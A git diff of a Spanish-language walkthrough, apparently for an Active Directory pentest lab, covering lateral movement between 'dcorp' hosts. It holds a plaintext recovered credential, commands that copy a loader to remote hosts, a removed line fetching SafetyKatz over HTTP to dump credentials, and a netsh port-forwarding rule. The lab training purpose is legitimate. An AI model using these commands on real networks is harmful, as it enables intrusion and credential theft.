@@ -623,7 +623,7 @@ Una vez copiado lo ejecutaremos
 ```
 
 Obteniendo la credencial del usuario srvadmin en texto plano *TheKeyUs3ron@anyMachine!*
-Ahora podemos ejecutar un proceso como srvadmin y obtener una shell como Administrador siendo el usuario studen97
+Ahora podemos ejecutar un proceso como srvadmin y obtener una shell como Administrador srvadminsiendo el usuario studen97
 
 ```shell
 [dcorp-adminsrv]
@@ -649,18 +649,17 @@ Descubriendo que los tiene en *adminsrv* y *mgmt*
 
 Teniendo acceso de administrador local en esa maquina de dcorp-mgmt y sabemos que hay una sesión activa en esa maquina como es svcadmin usaremos SafetyKatz para extraer las credenciales de la maquina, copiando el Loader a dcorp-mgmt
 ```shell
-echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+[student97]
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-adminsrv\C$\Users\Public\Loader.exe
 ```
-
-Extraeremos las credenciales
-```shell
-winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"
-```
-
 
 Haremos el renvió de puertos
 ```shell
+[student97]
 winrs -r:dcorp-adminsrv cmd
+```
+
+```
 netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97
 ```
 
